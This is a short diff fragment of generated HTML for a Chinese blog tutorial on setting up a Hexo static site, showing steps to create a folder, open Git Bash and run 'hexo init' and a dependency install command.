+<h3 id="3，在任意盘创建文件夹（你喜欢的都可以：C-D-E-F-G）命名为hexo（其实什么都可以的）"><a href="#3，在任意盘创建文件夹（你喜欢的都可以：C-D-E-F-G）命名为hexo（其实什么都可以的）" class="headerlink" title="3，在任意盘创建文件夹（你喜欢的都可以：C/D/E/F/G）命名为hexo（其实什么都可以的）"></a>3，在任意盘创建文件夹（你喜欢的都可以：C/D/E/F/G）命名为hexo（其实什么都可以的）</h3><pre><code>进入到你所建文件的目录，记住是你刚创建的命名是什么我就不知道了，我的是hexo，鼠标右键Git Bash 也会出现命令模式
+</code></pre><h3 id="4，生成文件："><a href="#4，生成文件：" class="headerlink" title="4，生成文件："></a>4，生成文件：</h3><pre><code>hexo init
+安装依赖包：
+nmp install
+</code></pre>
+      
+    </div>
+    <footer>
+      
+        
+          <div class="alignleft">
+            <a href="/2016/04/16/6/#more" class="more-link">Read More</a>
           </div>
         
         
